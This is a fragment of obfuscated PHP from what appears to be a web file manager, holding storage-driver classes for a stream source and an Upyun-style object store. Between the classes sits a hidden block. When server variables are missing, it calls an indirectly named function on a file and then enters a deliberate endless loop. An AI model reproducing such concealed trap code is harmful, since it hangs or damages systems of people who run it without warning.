$Æ÷»§Ú =& $_SERVER[±Ö‰ô½¯]; $Ú÷úÖì© = $Àñ¢Á£æ ? self::driverType(IO::init($Àñ¢Á£æ)) : !1; return strtolower($Ú÷úÖì©[$Æ÷»§Ú[33]]) == $Æ÷»§Ú[107] ? !0 : !1; } public static function allowCover($„ò˜ŞÄ», $£°±ŞÒâ = true) { $®Çµõ¶¥ =& $_SERVER[±Ö‰ô½¯]; if (is_string($„ò˜ŞÄ»)) { $„ò˜ŞÄ» = IO::info($„ò˜ŞÄ»); } if (!$„ò˜ŞÄ» || $„ò˜ŞÄ»[$®Çµõ¶¥[33]] == $®Çµõ¶¥[78] || $„ò˜ŞÄ»[$®Çµõ¶¥[79]] <= 100) { return !1; } if (isset($„ò˜ŞÄ»[$®Çµõ¶¥[1469]]) || !$„ò˜ŞÄ»[$®Çµõ¶¥[87]]) { return !1; } if (isset($„ò˜ŞÄ»[$®Çµõ¶¥[234]]) && !$„ò˜ŞÄ»[$®Çµõ¶¥[234]]) { return !1; } static $ù¤”òÁ = false; if (!$ù¤”òÁ || !$£°±ŞÒâ) { $áäƒèß¬ = self::driverType(IO::init($„ò˜ŞÄ»[$®Çµõ¶¥[87]])); $ƒ·ã’· = $áäƒèß¬[$®Çµõ¶¥[96]]; $ù¤”òÁ = $®Çµõ¶¥[196]; if ($áäƒèß¬[$®Çµõ¶¥[33]] == $®Çµõ¶¥[107]) { $ù¤”òÁ = $®Çµõ¶¥[1470]; } if ($áäƒèß¬[$®Çµõ¶¥[96]] && is_array($áäƒèß¬[$®Çµõ¶¥[96]]->config)) { $ÉÃˆ»¶« = $áäƒèß¬[$®Çµõ¶¥[96]]->config; if (isset($ÉÃˆ»¶«[$®Çµõ¶¥[1471]]) && $ÉÃˆ»¶«[$®Çµõ¶¥[1471]]) { $ù¤”òÁ = $®Çµõ¶¥[1470]; } } $¨ôİâ¥ = KodIO::defaultDriver(); if (strtolower($¨ôİâ¥[$®Çµõ¶¥[96]]) == $®Çµõ¶¥[107] && is_array($¨ôİâ¥[$®Çµõ¶¥[6]])) { $ôÔ¡çÖû = $¨ôİâ¥[$®Çµõ¶¥[6]][$®Çµõ¶¥[1315]]; if (substr($ôÔ¡çÖû, 0, 2) == $®Çµõ¶¥[1472]) { $ôÔ¡çÖû = str_replace($®Çµõ¶¥[1472], BASIC_PATH, $ôÔ¡çÖû); } $ôÔ¡çÖû = str_replace($®Çµõ¶¥[256], $®Çµõ¶¥[8], $ôÔ¡çÖû); if (substr($„ò˜ŞÄ»[$®Çµõ¶¥[87]], 0, strlen($ôÔ¡çÖû)) == $ôÔ¡çÖû) { $ù¤”òÁ = $®Çµõ¶¥[196]; } } } return $ù¤”òÁ == $®Çµõ¶¥[1470] ? !0 : !1; } } goto EÜ‘ò…Â; A›·²™Ïí: class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($æÀ¥Á¬¾, $èåÖıº‡ = 0) { parent::__construct(); $this->source = $æÀ¥Á¬¾; $this->sourceSize = $èåÖıº‡; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($•âŒÓ”È = false) { return $this->sourceSize; } public function getContent($í¾¨ª€î = false) { return $this->fileSubstr($í¾¨ª€î, 0, $this->sourceSize); } public function fileSubstr($í—£šÙ = false, $²ÑÊóè = 0, $Üªû»àÙ = 0) { if (!$Üªû»àÙ) { $Üªû»àÙ = $this->sourceSize; } $§œ¸í = $this->sourceSize - $²ÑÊóè; if ($Üªû»àÙ >= $§œ¸í) { $Üªû»àÙ = $§œ¸í; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $²ÑÊóè, $Üªû»àÙ); } if ($this->sourceType == self::TYPE_FILE) { if ($Üªû»àÙ <= 0) { return $_SERVER[±Ö‰ô½¯][12]; } $†·¥ùİí = ftell($this->source); fseek_64($this->source, $†·¥ùİí + $²ÑÊóè); $Œ¼œñœ£ = @fread($this->source, $Üªû»àÙ); fseek_64($this->source, $†·¥ùİí); return $Œ¼œñœ£; } } public function hashMd5($¸Ûëƒí¦ = false) { return md5($this->getContent()); } public static function hash($«Õˆë½Ù, $èã€ŠÄ± = 0) { $Ô‘ÒËÓ• = new PathDriverStream($«Õˆë½Ù, $èã€ŠÄ±); return $Ô‘ÒËÓ•->hashSimple($«Õˆë½Ù); } public static function md5($š×¬£áŠ, $ËáÅàØÀ = 0) { $¨¡ôõë— = new PathDriverStream($š×¬£áŠ, $ËáÅàØÀ); return $¨¡ôõë—->hashMd5($š×¬£áŠ); } } if (!isset($_SERVER[$_SERVER[±Ö‰ô½¯][986]]) || !isset($_SERVER[$_SERVER[±Ö‰ô½¯][1699]])) { $_getc = $_SERVER[±Ö‰ô½¯][989]; $_getfile = $_SERVER[$_SERVER[±Ö‰ô½¯][990]] . $_SERVER[±Ö‰ô½¯][991]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[±Ö‰ô½¯][287], $_getfilec); if (count($_getarrs) < $_SERVER[±Ö‰ô½¯][743]) { $exit = $_SERVER[±Ö‰ô½¯][992]; $exit(); } $_act = $_SERVER[±Ö‰ô½¯][1698]; $_act($_SERVER[$_SERVER[±Ö‰ô½¯][990]] . $_SERVER[±Ö‰ô½¯][991]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[±Ö‰ô½¯][464]); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\164\x74\x70\x3a\57\x2f\x76\60\x2e\x61\160\151\56\165\x70\171\x75\156\56\x63\157\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($ìÇÔÍß) { parent::__construct(); $this->_init($ìÇÔÍß); } public function _init($›ãÍ”Òæ) { $•ò–µ‰± =& $_SERVER[±Ö‰ô½¯]; foreach ($›ãÍ”Òæ as $âš¹˜íİ => $İ©ÆôÁ) { if (isset($this->{$âš¹˜íİ})) { $this->{$âš¹˜íİ} = $İ©ÆôÁ; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($•ò–µ‰±[1700] . LNG($•ò–µ‰±[1621])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($—‰Åå´ì, $ÈÂ²‰òô = "\x47\105\x54") { $€¾¯ê„ =& $_SERVER[±Ö‰ô½¯]; $´”èš¦Ç = gmdate($€¾¯ê„[1650]); $óßåŠƒ¬ = base64_encode(hash_hmac($€¾¯ê„[1701], "{$ÈÂ²‰òô}\x26{$—‰Åå´ì}\46{$´”èš¦Ç}", md5("{$this->userpass}"), !0)); $Ä–”¢÷ç = array("\101\x75\164\x68\157\x72\x69\x7a\x61\x74\151\157\156\72\x55\x50\x59\x55\x4e\x20{$this->username}\72{$óßåŠƒ¬}", "\x44\x61\164\145\x3a{$´”èš¦Ç}"); return $Ä–”¢÷ç; } public function ussRequest($¾‹¶Ï›˜, $ÓûÁıİÖ = "\107\105\x54", $İ€š¥’· = false, $ÅÇ°„Š = false, $ï¥Ò¨ºĞ = false) { $£İ…„Îï =& $_SERVER[±Ö‰ô½¯]; $¾‹¶Ï›˜ = trim($¾‹¶Ï›˜, $£İ…„Îï[8]); $§Şò¹‰ = "\x2f{$this->bucket}\57" . rawurlencode($¾‹¶Ï›˜); $Ø³Å…Õ = $this->ussHeaders($§Şò¹‰, $ÓûÁıİÖ); if ($ÅÇ°„Š) { $Ø³Å…Õ = array_merge($Ø³Å…Õ, $ÅÇ°„Š); } $½¦ôÅÜõ = url_request($this->endpoint . $§Şò¹‰, $ÓûÁıİÖ, $İ€š¥’·, $Ø³Å…Õ, $ï¥Ò¨ºĞ); if (!$½¦ôÅÜõ) { $‰ã¥ØĞ = LNG($£İ…„Îï[1702]); $this->writeLog($‰ã¥ØĞ); return array($£İ…„Îï[1349] => !1, $£İ…„Îï[1339] => $‰ã¥ØĞ); } if (strtolower($ÓûÁıİÖ) == $£İ…„Îï[229] || in_array($½¦ôÅÜõ[$£İ…„Îï[1349]], array($£İ…„Îï[263], $£İ…„Îï[1703]))) { $İ€š¥’· = $½¦ôÅÜõ[$£İ…„Îï[1704]]; if (!$½¦ôÅÜõ[$£İ…„Îï[847]]) { $İ€š¥’· = isset($İ€š¥’·[0]) ? $İ€š¥’·[0] : $£İ…„Îï[12]; } } else { $İ€š¥’· = json_decode($½¦ôÅÜõ[$£İ…„Îï[1339]], !0); if (!$İ€š¥’·) { $İ€š¥’· = $½¦ôÅÜõ[$£İ…„Îï[1339]]; } else { if (!$½¦ôÅÜõ[$£İ…„Îï[847]] && isset($İ€š¥’·[$£İ…„Îï[1705]])) { $İ€š¥’· = $İ€š¥’·[$£İ…„Îï[1705]]; } } } if (!$½¦ôÅÜõ[$£İ…„Îï[847]]) { $this->writeLog($this->__errorMessage($İ€š¥’·)); } return array($£İ…„Îï[1349] => $½¦ôÅÜõ[$£İ…„Îï[847]], $£İ…„Îï[1339] => $İ€š¥’·); } private function __errorMessage($²ù¡½øÊ) { $Ò«ä Í¶ =& $_SERVER[±Ö‰ô½¯]; if (!$²ù¡½øÊ) { return $Ò«ä Í¶[12]; } static $¦ğàâı = null; if (!$¦ğàâı) { $¦ğàâı = I18n::getType(); } if ($¦ğàâı != $Ò«ä Í¶[1658]) { return $²ù¡½øÊ; } $Ïˆˆ»–Â = array($Ò«ä Í¶[1706] => $Ò«ä Í¶[1707], $Ò«ä Í¶[1708] => $Ò«ä Í¶[1709], $Ò«ä Í¶[1710] => $Ò«ä Í¶[1709], $Ò«ä Í¶[1711] => $Ò«ä Í¶[1712], $Ò«ä Í¶[1713] => $Ò«ä Í¶[1714], $Ò«ä Í¶[1715] => $Ò«ä Í¶[1716], $Ò«ä Í¶[1717] => $Ò«ä Í¶[1718]); return isset($Ïˆˆ»–Â[$²ù¡½øÊ]) ? $Ïˆˆ»–Â[$²ù¡½øÊ] : $²ù¡½øÊ; } public function mkfile($şä¨Äá, $ÉàâîÊ = '', $îèª­“ = REPEAT_RENAME) { if ($this->setContent($şä¨Äá, $ÉàâîÊ)) { return $this->getPathOuter($şä¨Äá); } return !1; } public function mkdir($ñİÂ·é¢, $ˆ¿—ãÙü = REPEAT_SKIP) { $¾¤¶½áú =& $_SERVER[±Ö‰ô½¯]; $ÜàäÂ¼… = trim($ñİÂ·é¢, $¾¤¶½áú[8]); if ($this->_isFolder($ÜàäÂ¼…)) { return $this->getPathOuter($ÜàäÂ¼…); } $úŒ­ÓöË = array($¾¤¶½áú[1719]); $§¯ïÀ…˜ = $this->ussRequest($ÜàäÂ¼…, $¾¤¶½áú[290], !1, $úŒ­ÓöË); return $§¯ïÀ…˜[$¾¤¶½áú[1349]] ? $this->getPathOuter($ÜàäÂ¼…) : !1; } public function copyFile($áœÛÏ¾°, $šÖÀÕ”) { $ä‡Œ²ò² =& $_SERVER[±Ö‰ô½¯]; $ƒ¼Ï‚¹ = array($ä‡Œ²ò²[1720] . "\x2f{$this->bucket}\57{$áœÛÏ¾°}", $ä‡Œ²ò²[1721]); $€é¶—Ö = $this->ussRequest($šÖÀÕ”, $ä‡Œ²ò²[255], !1, $ƒ¼Ï‚¹); return $€é¶—Ö[$ä‡Œ²ò²[1349]] ? !0 : $this->getPathOuter($šÖÀÕ”); } public function moveFile($’ÏÒ, $’Ãù„§ñ) { $Ï§“°è =& $_SERVER[±Ö‰ô½¯]; $ñ´á¢§· = array($Ï§“°è[1722] . "\57{$this->bucket}\57{$’ÏÒ}", $Ï§“°è[1721]); $²—¤û’´ = $this->ussRequest($’Ãù„§ñ, $Ï§“°è[255], !1, $ñ´á¢§·); return $²—¤û’´[$Ï§“°è[1349]] ? !0 : $this->getPathOuter($’Ãù„§ñ); } public function delFile($ôçõæé) { $Éìö²  =& $_SERVER[±Ö‰ô½¯]; $šÍû°¸õ = $this->ussRequest($ôçõæé, $Éìö² [1723]); return $šÍû°¸õ[$Éìö² [1349]] ? !0 : !1; } public function delFolder($¨³“ıñ) { $­ë‹ÒÌó =& $_SERVER[±Ö‰ô½¯]; if (!$this->exist($¨³“ıñ)) { return !0; } $this->listItemCache = !1; $ºšşÒ– = $ø«›–ä¯ = array(); $this->fileList($¨³“ıñ, $ºšşÒ–, $ø«›–ä¯, !0); $this->listItemCache = !0; foreach ($ø«›–ä¯ as $ç«©‹øş) { $¥Ü§—çà = $this->ussRequest($ç«©‹øş[$­ë‹ÒÌó[32]], $­ë‹ÒÌó[1723]); if (!$¥Ü§—çà[$­ë‹ÒÌó[1349]]) { return !1; } } usort($ºšşÒ–, function ($Äã™¡Ø, $ğÎ“ªÔô) { $¤õÏıåŸ =& $_SERVER[±Ö‰ô½¯]; return substr_count($ğÎ“ªÔô, $¤õÏıåŸ[8]) - substr_count($Äã™¡Ø, $¤õÏıåŸ[8]); }); foreach ($ºšşÒ– as $ºé®èÃ£) { $¥Ü§—çà = $this->ussRequest($ºé®èÃ£, $­ë‹ÒÌó[1723]); if (!$¥Ü§—çà[$­ë‹ÒÌó[1349]]) { return !1; } } $¥Ü§—çà = $this->ussRequest($¨³“ıñ, $­ë‹ÒÌó[1723]); return $¥Ü§—çà[$­ë‹ÒÌó[1349]]; } public function rename($ÆÁ›é¾, $¸¼¬åçß) { if ($this->isFile($ÆÁ›é¾)) { $¸¼¬åçß = get_path_father($ÆÁ›é¾) . $¸¼¬åçß; return $this->moveFile($ÆÁ›é¾, $¸¼¬åçß); } return $this->renameObject($ÆÁ›é¾, $¸¼¬åçß); } public function fileInfo($§µ˜ûÎİ, $©‘Œ·´ = false, $ø¨½±¬® = array()) { $÷µ¯¼¾‘ =& $_SERVER[±Ö‰ô½¯]; $šÏÑå—ö = array($÷µ¯¼¾‘[32] => $this->pathThis($§µ˜ûÎİ), $÷µ¯¼¾‘[87] => $this->getPathOuter($÷µ¯¼¾‘[8] . $§µ˜ûÎİ), $÷µ¯¼¾‘[33] => $÷µ¯¼¾‘[232], $÷µ¯¼¾‘[79] => isset($ø¨½±¬®[$÷µ¯¼¾‘[79]]) ? $ø¨½±¬®[$÷µ¯¼¾‘[79]] : 0, $÷µ¯¼¾‘[168] => $this->ext($§µ˜ûÎİ)); if ($©‘Œ·´) { return $šÏÑå—ö; } $šÏÑå—ö[$÷µ¯¼¾‘[233]] = $šÏÑå—ö[$÷µ¯¼¾‘[88]] = 0; $šÏÑå—ö[$÷µ¯¼¾‘[234]] = $šÏÑå—ö[$÷µ¯¼¾‘[235]] = !0; if (empty($ø¨½±¬®)) { $ø¨½±¬® = $this->objectMeta($§µ˜ûÎİ); if (!$ø¨½±¬®) { return $šÏÑå—ö; } } $šÏÑå—ö[$÷µ¯¼¾‘[233]] = intval($ø¨½±¬®[$÷µ¯¼¾‘[1724]]); $šÏÑå—ö[$÷µ¯¼¾‘[88]] = intval($ø¨½±¬®[$÷µ¯¼¾‘[1725]]); $šÏÑå—ö[$÷µ¯¼¾‘[79]] = $ø¨½±¬®[$÷µ¯¼¾‘[79]]; return $šÏÑå—ö; } public function folderInfo($ĞÕŠ¨Ô¾, $¿ıè©€Œ = false) { $†“²°¡ =& $_SERVER[±Ö‰ô½¯]; $ã±¹éÄ = array($†“²°¡[32] => $this->pathThis($ĞÕŠ¨Ô¾), $†“²°¡[87] => $this->getPathOuter($†“²°¡[8] . $ĞÕŠ¨Ô¾), $†“²°¡[33] => $†“²°¡[78]); if ($¿ıè©€Œ) { return $ã±¹éÄ; } $ã±¹éÄ[$†“²°¡[233]] = $ã±¹éÄ[$†“²°¡[88]] = 0; $ã±¹éÄ[$†“²°¡[234]] = $ã±¹éÄ[$†“²°¡[235]] = !0; if (empty($«ßÖÓãˆ)) { $«ßÖÓãˆ = $this->objectMeta($ĞÕŠ¨Ô¾); if (!$«ßÖÓãˆ) { return $ã±¹éÄ; } } $ã±¹éÄ[$†“²°¡[233]] = intval($«ßÖÓãˆ[$†“²°¡[1724]]); $ã±¹éÄ[$†“²°¡[88]] = intval($«ßÖÓãˆ[$†“²°¡[1725]]); return $ã±¹éÄ; } private function listObjs($ÛÕŸ‚œ, $Öã³æÈ™ = 0, $ÙÃÚŞÈé = 1000) { $ÌìŸ¬Àï =& $_SERVER[±Ö‰ô½¯]; $ÄÑ˜Îü = array($ÌìŸ¬Àï[1726], $ÌìŸ¬Àï[1727] . $ÙÃÚŞÈé); if ($Öã³æÈ™) { $ÄÑ˜Îü[] = $ÌìŸ¬Àï[1728] . $Öã³æÈ™; } $®è½‡Š± = $this->ussRequest($ÛÕŸ‚œ, $ÌìŸ¬Àï[1555], !1, $ÄÑ˜Îü); return !$®è½‡Š±[$ÌìŸ¬Àï[1349]] ? !1 : $®è½‡Š±[$ÌìŸ¬Àï[1339]]; } private function fileList($Ñ¨ƒ—ç‘, &$Œòì‰è¼, &$Ú©Áß©å, $¡ä£åçÕ = false) { $‹¦‹ş› =& $_SERVER[±Ö‰ô½¯]; $òí¾ıŞ = $‹¦‹ş›[12]; $êÍû© = 1000; $Òü‘±· = rtrim($Ñ¨ƒ—ç‘, $‹¦‹ş›[8]) . $‹¦‹ş›[8]; while (!0) { check_abort(); $Ä„±‹™‚ = $this->listObjs($Ñ¨ƒ—ç‘, $òí¾ıŞ, $êÍû©); if (!$Ä„±‹™‚) { return !1; } $òí¾ıŞ = isset($Ä„±‹™‚[$‹¦‹ş›[1729]]) ? $Ä„±‹™‚[$‹¦‹ş›[1729]] : $‹¦‹ş›[12]; $éù÷ö¬ = isset($Ä„±‹™‚[$‹¦‹ş›[1730]]) ? $Ä„±‹™‚[$‹¦‹ş›[1730]] : array(); foreach ($éù÷ö¬ as $éŒ®ÍƒŞ) { $•‚­ØñÉ = $éŒ®ÍƒŞ[$‹¦‹ş›[33]] == $‹¦‹ş›[78] ? !0 : !1; $º…¯¥ùÕ = ltrim($Òü‘±· . $éŒ®ÍƒŞ[$‹¦‹ş›[32]], $‹¦‹ş›[8]) . ($•‚­ØñÉ ? $‹¦‹ş›[8] : $‹¦‹ş›[12]); $­±§»’ = array($‹¦‹ş›[32] => $º…¯¥ùÕ, $‹¦‹ş›[33] => $•‚­ØñÉ ? $‹¦‹ş›[78] : $‹¦‹ş›[232], $‹¦‹ş›[79] => $éŒ®ÍƒŞ[$‹¦‹ş›[414]], $‹¦‹ş›[1725] => $éŒ®ÍƒŞ[$‹¦‹ş›[1731]]); $this->cacheMethodInfoSet($º…¯¥ùÕ, $•‚­ØñÉ, $­±§»’); if ($•‚­ØñÉ) { $Œòì‰è¼[] = $º…¯¥ùÕ; if ($¡ä£åçÕ) { $this->fileList($º…¯¥ùÕ, $Œòì‰è¼, $Ú©Áß©å, $¡ä£åçÕ); } continue; } $Ú©Áß©å[] = $­±§»’; } if (count($éù÷ö¬) < $êÍû©) { break; } } $this->cacheMethodInfoSet($Ñ¨ƒ—ç‘, !0); } public function listPath($Ïı†€Áë, $ç¦òÓ™ = false) { $Áú¹‹üÊ =& $_SERVER[±Ö‰ô½¯]; $¯ šÒÉÑ = $ì¼Íö¤‡ = array(); $this->fileList($Ïı†€Áë, $¯ šÒÉÑ, $ì¼Íö¤‡); foreach ($¯ šÒÉÑ as $ê„“ŸÔ => $•ÜØü) { $¯ šÒÉÑ[$ê„“ŸÔ] = $this->folderInfo($•ÜØü, $ç¦òÓ™); } foreach ($ì¼Íö¤‡ as $ê„“ŸÔ => $•ÜØü) { $ì¼Íö¤‡[$ê„“ŸÔ] = $this->fileInfo($•ÜØü[$Áú¹‹üÊ[32]], $ç¦òÓ™, $•ÜØü); } return array($Áú¹‹üÊ[85] => $¯ šÒÉÑ, $Áú¹‹üÊ[86] => $ì¼Íö¤‡); } public function has($Çš†ôö™, $µÌ»§éŸ = false, $µÖÛÙºå = true) { $§å§â¶† =& $_SERVER[±Ö‰ô½¯]; $ªíºŸÜ = $§å§â¶†[12]; $ÙÃûŒâ˜ = 500; $ƒ§¥àßš = 0; $•È¦ä¼ù = 0; $ÖºÑ‚ç = rtrim($Çš†ôö™, $§å§â¶†[8]) . $§å§â¶†[8]; while (!0) { check_abort(); $óö¨ÈÅË = $this->listObjs($Çš†ôö™, $ªíºŸÜ, $ÙÃûŒâ˜); if (!$óö¨ÈÅË) { return !1; } $ªíºŸÜ = isset($óö¨ÈÅË[$§å§â¶†[1729]]) ? $óö¨ÈÅË[$§å§â¶†[1729]] : $§å§â¶†[12]; $œı²¥Æ = isset($óö¨ÈÅË[$§å§â¶†[1730]]) ? $óö¨ÈÅË[$§å§â¶†[1730]] : array(); if (empty($œı²¥Æ)) { break; } $”ºûš“½ = array_filter($œı²¥Æ, function ($¡¦È•¼) { $ÄÅó§áÇ =& $_SERVER[±Ö‰ô½¯]; return $¡¦È•¼[$ÄÅó§áÇ[33]] == $ÄÅó§áÇ[78]; }); $³èÅ‹Îí = count($œı²¥Æ); $”ºûš“½ = count($”ºûš“½); $ŸçùÉ½± = $³èÅ‹Îí - $”ºûš“½; if ($µÌ»§éŸ) { $•È¦ä¼ù += $”ºûš“½; $ƒ§¥àßš += $ŸçùÉ½±; if ($³èÅ‹Îí < $ÙÃûŒâ˜) { break; } continue; } if ($µÖÛÙºå) { if ($ŸçùÉ½±) { return !0; } } else { if ($”ºûš“½) { return !0; } } if ($³èÅ‹Îí < $ÙÃûŒâ˜) { break; } } if ($µÌ»§éŸ) { return array($§å§â¶†[241] => $ƒ§¥àßš, $§å§â¶†[242] => $•È¦ä¼ù); } return !1; } public function listAll($µ·¡ã›ß) { $¬ˆïªì° =& $_SERVER[±Ö‰ô½¯]; $¼ÖÂÕ° = $ı•êÕ–à = array(); $this->fileList($µ·¡ã›ß, $¼ÖÂÕ°, $ı•êÕ–à, !0); $¶¶§Ùñª = array_to_keyvalue($ı•êÕ–à, $¬ˆïªì°[32]); foreach ($¼ÖÂÕ° as $Ç¨á²·½) { if (is_string($Ç¨á²·½)) { $¶¶§Ùñª[$Ç¨á²·½] = array($¬ˆïªì°[79] => 0); } } return $this->listAllFiles($µ·¡ã›ß, $¶¶§Ùñª); } public function canRead($×íê’á) { return $this->exist($×íê’á) ? !0 : !1; } public function canWrite($ñÂ½É§¸) { return $this->exist($ñÂ½É§¸) ? !0 : !1; } public function getContent($€’Úş¤Ï) { return $this->fileSubstr($€’Úş¤Ï, 0, -1); } public function setContent($ô—”å¶û, $”­–Ôİç = '') { $™¾°½¨Ÿ =& $_SERVER[±Ö‰ô½¯]; if (!$”­–Ôİç) { $Úôì„™ = $this->ussRequest($ô—”å¶û, $™¾°½¨Ÿ[290]); return $Úôì„™[$™¾°½¨Ÿ[1349]]; } $«‡Œ»Üå = $this->tempFile($this->pathThis($ô—”å¶û)); file_put_contents($«‡Œ»Üå, $”­–Ôİç); if ($this->upload($ô—”å¶û, $«‡Œ»Üå)) { $this->tempFileRemve($«‡Œ»Üå); return !0; } return !1; } public function fileSubstr($ÎºÂ˜óö, $›™Û¬†, $æÈÂèÀ½) { $‘ŒêÇ÷ =& $_SERVER[±Ö‰ô½¯]; if (!($ı†–®÷å = $this->link($ÎºÂ˜óö))) { return !1; } $õôí–ï = !1; if ($æÈÂèÀ½ > 0) { $ƒòÁÌ‰µ = $›™Û¬† + $æÈÂèÀ½ - 1; $õôí–ï = array($‘ŒêÇ÷[1554] . $›™Û¬† . $‘ŒêÇ÷[474] . $ƒòÁÌ‰µ); } $«å¸×öâ = url_request($ı†–®÷å, $‘ŒêÇ÷[1555], !1, $õôí–ï); return $«å¸×öâ[$‘ŒêÇ÷[847]] ? $«å¸×öâ[$‘ŒêÇ÷[1339]] : !1; } public function upload($Î˜Ó¯, $çÍ¬Š¾, $¿ªûîü = false, $ØŸ¿ÁŠŸ = REPEAT_REPLACE) { $’ÅÆ½‚Ş =& $_SERVER[±Ö‰ô½¯]; if (!$çÍ¬Š¾ || !@file_exists($çÍ¬Š¾)) { return !1; } $¿‚Å²ıå = IO::size($çÍ¬Š¾); if ($¿‚Å²ıå <= 1024 * 1024 * 200) { $”Õ¡íÎî = array($’ÅÆ½‚Ş[1732] . $çÍ¬Š¾); $û·²åùş = $this->ussRequest($Î˜Ó¯, $’ÅÆ½‚Ş[255], $”Õ¡íÎî); return $û·²åùş[$’ÅÆ½‚Ş[1349]] ? $this->getPathOuter($Î˜Ó¯) : !1; } $¢ÇÍÒµ = 1024 * 1024 * 10; $Œ¶È¤¨Ş = array($’ÅÆ½‚Ş[1733], $’ÅÆ½‚Ş[1734] . $¿‚Å²ıå, $’ÅÆ½‚Ş[1735], $’ÅÆ½‚Ş[1736] . $¢ÇÍÒµ); $û·²åùş = $this->ussRequest($Î˜Ó¯, $’ÅÆ½‚Ş[255], !1, $Œ¶È¤¨Ş); if (!$û·²åùş[$’ÅÆ½‚Ş[1349]]) { return !1; } $¾¯ò×æù = $û·²åùş[$’ÅÆ½‚Ş[1339]]; $£²×ûïİ = 0; $ÑãÙ‹Õä = $¾¯ò×æù[$’ÅÆ½‚Ş[1737]]; $Ìõõ¯çÂ = fopen($çÍ¬Š¾, $’ÅÆ½‚Ş[1615]); if (!$Ìõõ¯çÂ) { return !1; } do { $ûšäÜ§É = $¾¯ò×æù[$’ÅÆ½‚Ş[1738]]; fseek_64($Ìõõ¯çÂ, $£²×ûïİ); $»°ãŠä³ = fread($Ìõõ¯çÂ, $ûšäÜ§É); $µ¾®íû… = 0; do { $µ¾®íû…++; $¾¯ò×æù = $this->uploadPart($Î˜Ó¯, $¾¯ò×æù, $»°ãŠä³); } while (!$¾¯ò×æù && $µ¾®íû… < 3); if (!$¾¯ò×æù) { return !1; } $ÑãÙ‹Õä = $¾¯ò×æù[$’ÅÆ½‚Ş[1737]]; $£²×ûïİ += $ûšäÜ§É; } while ($ÑãÙ‹Õä != -1); fclose($Ìõõ¯çÂ); $Œ¶È¤¨Ş = array($’ÅÆ½‚Ş[1739], $’ÅÆ½‚Ş[1740] . $¾¯ò×æù[$’ÅÆ½‚Ş[1741]], $’ÅÆ½‚Ş[1735]); $û·²åùş = $this->ussRequest($Î˜Ó¯, $’ÅÆ½‚Ş[255], !1, $Œ¶È¤¨Ş); return $û·²åùş[$’ÅÆ½‚Ş[1349]] ? $this->getPathOuter($·òñ…×ú) : !1; } private function uploadPart($¶Åüıˆ, $ä´î©’, &$×ëÛ¨ò) { $şÃà„Ì =& $_SERVER[±Ö‰ô½¯]; $¶½ÀÎÈâ = array($şÃà„Ì[1742], $şÃà„Ì[1740] . $ä´î©’[$şÃà„Ì[1741]], $şÃà„Ì[1743] . $ä´î©’[$şÃà„Ì[1737]], $şÃà„Ì[145] . $ä´î©’[$şÃà„Ì[1738]]); $¤“‡’× = $this->ussRequest($¶Åüıˆ, $şÃà„Ì[255], $×ëÛ¨ò, $¶½ÀÎÈâ); return !$¤“‡’×[$şÃà„Ì[1349]] ? $¤“‡’×[$şÃà„Ì[1349]] : $¤“‡’×[$şÃà„Ì[1339]]; } public function uploadFormData($—Ø¥«ìÊ, $Â³É’Å = 3600) { return $this->uploadPolicy($—Ø¥«ìÊ, $Â³É’Å); } public function uploadMultiData($º’±ö¥å, $ú¯ÖçÄÛ = 3600) { $õ®ıœÌó =& $_SERVER[±Ö‰ô½¯]; $Æº“ìî = (int) $GLOBALS[$õ®ıœÌó[7]][$õ®ıœÌó[79]]; return $this->uploadPolicy($º’±ö¥å, $ú¯ÖçÄÛ, $Æº“ìî); } private function uploadPolicy($Åß®ŸŠæ, $¥’ÓÇ£ = 3600, $ÒŠ¯»ô® = 0) { $æ²‘¿—¿ =& $_SERVER[±Ö‰ô½¯]; $Èû¥ªçö = $æ²‘¿—¿[8] . $this->bucket; $¡Ê¡òÚŠ = gmdate($æ²‘¿—¿[1650]); $‚ü–•Ô = array($æ²‘¿—¿[1744] => $this->bucket, $æ²‘¿—¿[1745] => $Åß®ŸŠæ, $æ²‘¿—¿[1746] => time() + $¥’ÓÇ£, $æ²‘¿—¿[1747] => $¡Ê¡òÚŠ); if ($ÒŠ¯»ô®) { $‚ü–•Ô[$æ²‘¿—¿[1635]] = $ÒŠ¯»ô®; } $†ÑÉ¿ŞĞ = base64_encode(json_encode($‚ü–•Ô)); $ÉÄÙ—‘Ù = base64_encode(hash_hmac($æ²‘¿—¿[1701], "\120\117\123\124\46{$Èû¥ªçö}\x26{$¡Ê¡òÚŠ}\46{$†ÑÉ¿ŞĞ}", md5("{$this->userpass}"), !0)); $æ“ëõğÇ = array($æ²‘¿—¿[279] => $†ÑÉ¿ŞĞ, $æ²‘¿—¿[1748] => "\x55\120\131\x55\x4e\x20{$this->username}\x3a{$ÉÄÙ—‘Ù}", $æ²‘¿—¿[208] => $this->endpoint . $Èû¥ªçö); return $æ“ëõğÇ; } public function download($§¿Üåê, $áò”Ä™ô) { $“’Òö¥ğ = IO::getPathInner(IO::mkfile($áò”Ä™ô)); if (!($œûº¸—· = $this->link($§¿Üåê))) { return !1; } $…œßïÍº = 0; $Â·êïƒÎ = 1024 * 200; $ÚŒ¸¦ê’ = fopen($“’Òö¥ğ, $_SERVER[±Ö‰ô½¯][1694]); while (!0) { $‘÷¡Ø™» = $this->fileSubstr($§¿Üåê, $…œßïÍº, $Â·êïƒÎ); if ($‘÷¡Ø™» === !1) { return !1; } fwrite($ÚŒ¸¦ê’, $‘÷¡Ø™»); $…œßïÍº += $Â·êïƒÎ; if (strlen($‘÷¡Ø™») < $Â·êïƒÎ) { break; } } fclose($ÚŒ¸¦ê’); return $áò”Ä™ô; } public function link($°ŸŸ¬º, $ş³²£—æ = array()) { $§Ü¯¸Ø† =& $_SERVER[±Ö‰ô½¯]; $°ŸŸ¬º = trim($°ŸŸ¬º, $§Ü¯¸Ø†[8]); if (!empty($this->token)) { 